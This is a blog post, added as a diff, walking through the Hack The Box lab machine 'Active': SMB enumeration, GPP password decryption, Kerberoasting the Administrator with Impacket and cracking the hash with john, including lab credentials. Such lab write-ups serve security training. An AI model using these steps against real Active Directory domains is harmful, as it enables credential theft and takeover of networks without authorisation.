@@ -1,0 +1,136 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Active | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Active</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-06T00:27:13.000Z" id="date"> 2023-11-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='active.png'><img src="active.png" title="Active" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='windows.png'><img src="windows.png" alt="Windows" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Windows</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>eks & mrb3n</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>July 28, 2018</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.10.100<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-05 21:32 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.100<br>Host is up (0.059s latency).<br>Not shown: 982 closed tcp ports (reset)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br>| dns-nsid: <br>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-05 21:37:17Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49158/tcp open  msrpc         Microsoft Windows RPC<br>49165/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   210: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-11-05T21:38:15<br>|_  start_date: 2023-11-05T21:16:04<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 356.13 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>If we list all shares, we can see that the share ‘Replication’ can be read without a login</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.100<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/shares1.png'><img src="/HTB/Active/shares1.png"></p>
+<p>By exploring the Replication share, we can find Groups.xml in the following directory</p>
+<blockquote>
+<p>\active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.100/Replication<br><span class="hljs-built_in">cd</span> active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\<br>get Groups.xml<br></code></pre></td></tr></table></figure>
+<h3 id="gpp-decrypt"><a href="#gpp-decrypt" class="headerlink" title="gpp-decrypt"></a>gpp-decrypt</h3><p>We can now open the file in our local machine.<br>And we can find the user SVC_TGS and it’s encrypted password<br class='item-img' data-src='/HTB/Active/groupsxml.png'><img src="/HTB/Active/groupsxml.png"></p>
+<table>
+<thead>
+<tr>
+<th align="center">User</th>
+<th align="center">Hashed Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">SVC_TGS</td>
+<td align="center">edBSHOwhZLTjt&#x2F;QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw&#x2F;NglVmQ</td>
+</tr>
+</tbody></table>
+<p>We can decrypt the password with gpp-decrypt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/gppdecrypt.png'><img src="/HTB/Active/gppdecrypt.png"></p>
+<table>
+<thead>
+<tr>
+<th align="center">User</th>
+<th align="center">Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">SVC_TGS</td>
+<td align="center">GPPstillStandingStrong2k18</td>
+</tr>
+</tbody></table>
+<h3 id="user-txt-flag"><a href="#user-txt-flag" class="headerlink" title="user.txt flag"></a>user.txt flag</h3><p>With the obtained login, we now have access to more shares</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/shares2.png'><img src="/HTB/Active/shares2.png"></p>
+<p>Now just get the user flag from SVC_TGS desktop</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.100/Users --user=active.htb/SVC_TGS<br><span class="hljs-built_in">cd</span> SVC_TGS\Desktop<br>get user.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/userflag1.png'><img src="/HTB/Active/userflag1.png"><br class='item-img' data-src='/HTB/Active/userflag2.png'><img src="/HTB/Active/userflag2.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="AD-Enumeration"><a href="#AD-Enumeration" class="headerlink" title="AD Enumeration"></a>AD Enumeration</h3><p>We can use <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">Impacket</a> to enumerate the AD and get the Administrator’s password</p>
+<p>First we can use GetUserSPNs.py to list all users in the AD</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ GetADUsers.py -all active.htb/SVC_TGS -dc-ip 10.10.10.100<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/getadusers.png'><img src="/HTB/Active/getadusers.png"></p>
+<p>Now we can use GetUserSPNs.py to see if any users are configured with a Service Principal Name (SPNs), which if they are, can be exploited to get their hashed passwords.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/getusersspns1.png'><img src="/HTB/Active/getusersspns1.png"></p>
+<p>Administrator has been configured with SPN, so we can request the hashed password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 -request<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/getusersspns2.png'><img src="/HTB/Active/getusersspns2.png"></p>
+<p>Hashed Administrator Password:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$99a9dd2db5d42506d58d00a78e8a1a7f$02c3c483293fda1b6a78db5e73aaca413e25ec0e460649af4fd59973db4e23a386f9a08e4b16fd3dd658c2b93a4ecb691f709199a2e118b5eb024a0a71f4897f49fd9870e2d779914d4c2d803fcbe21f0169d3e4fe033cddc5ec738a5075f63b8e15433533bd91bc2137e1da914bef6646d800cae2a222d20e861d9f92e52fa7d7574b35be5fb38687cc5fb05dd694f54ec35a7090ec2e33596eec5592591e2c5fba102767afd0996fa40dc5ea56f97fdcb95d8856ff56b86c7e47fe27a54417211857ae991d75ac02ad72691fa5c0da60dc8dfb5680b795e49560dcb486ad84cb97d926fac1f4221fe25020c18686859e5d47ef1e47cf5644a2b96468d153bef80db6b5a55b14ccc50b972999c085b5599c0f8cafb829b733f4e6395621b112faa4c94d2a586efc235eb8cc5d4cf391ea9342aa37d0999e5a2f179a32d3a978fbc3cd1d432ea90f49bc6b7cec56c17764b9d8c6b738fa086ba9f0d1b6ccf07e88b340b16e1eeec43769649ef2b7575fab3dbfbe6c85ac29d7419c2bb4dae3f8e473e0e27f82d67a5159c65aaeddc666b9536f29bfdee6009e86c40786b56a4bedb4e8d0d62ccc904fba4741259a0a77dc5215f8274c482df2dfd21c057e22059a0da31ab4f7f7944926cf716fd5813fb555a1d2958c8785c2dc9d0adac347f1d667cb1d5736a5a5e6d8ca6927cfb69282348f574c79a41d09fcaf2012989006f36a54ff8255ba2febf22fe3d1db9f9440af840b1af1f794b7fddfe6a4e3f14f3e2cd147598c849674dedba85cffa181e6712a42c7c5104d0f5e827760f55f2cd321ad7e3e28eba49b35bcd115c62fe230f4f71f2834a308f87d77fd05525c41e2133c5aedf0314258493181bf54f5f16a6cefcd229553642c003414e8ade1b2720c696d6d37f9a4697765307cf9f5e5b3952b96ef8268bb84ccfc1562425915f88b412113c6d17665485c5a7e6192076941e7ad4b1c2ddc1f7c55c113603273beb788b5a31b9b872116729aeafed43828a8f7ef60604623da7dda0bb0226a80529654c24b47a71501360726ba64037a2bdaa462aa0fdcea2d4dbc3d9a68e65e332f4848784ad8f4cc78e8655d0bd3916eeed0c5b50ded80b4bef1dabadb18a6231faec50484942df4c137ee0157b3fb0b6fefcf5ab8ffe3cb1cc50ebb597e48d22b9492928c778bac322b33cc6c7d803d6943edb0b4ea2b79874adcb0eafece41d66114c047d5d946216a56875754c188bc898873261a174ae0<br></code></pre></td></tr></table></figure>
+
+<p>Paste the hash into a .txt file and use john to decrypt it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/john.png'><img src="/HTB/Active/john.png"></p>
+<table>
+<thead>
+<tr>
+<th align="center">User</th>
+<th align="center">Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Administrator</td>
+<td align="center">Ticketmaster1968</td>
+</tr>
+</tbody></table>
+<h3 id="root-txt-flag"><a href="#root-txt-flag" class="headerlink" title="root.txt flag"></a>root.txt flag</h3><p>With the Adminstrator login, we can get the root flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.100/Users --user=active.htb/Administrator<br><span class="hljs-built_in">cd</span> Administrator\Desktop\<br>get root.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Active/rootflag1.png'><img src="/HTB/Active/rootflag1.png"><br class='item-img' data-src='/HTB/Active/rootflag2.png'><img src="/HTB/Active/rootflag2.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Hospital/">← Next [HTB] Hospital</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Codify/">[HTB] Codify Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">2.1.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gpp-decrypt"><span class="toc-number">2.2.</span> <span class="toc-text">gpp-decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-txt-flag"><span class="toc-number">2.3.</span> <span class="toc-text">user.txt flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">3.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AD-Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">AD Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root-txt-flag"><span class="toc-number">3.2.</span> <span class="toc-text">root.txt flag</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
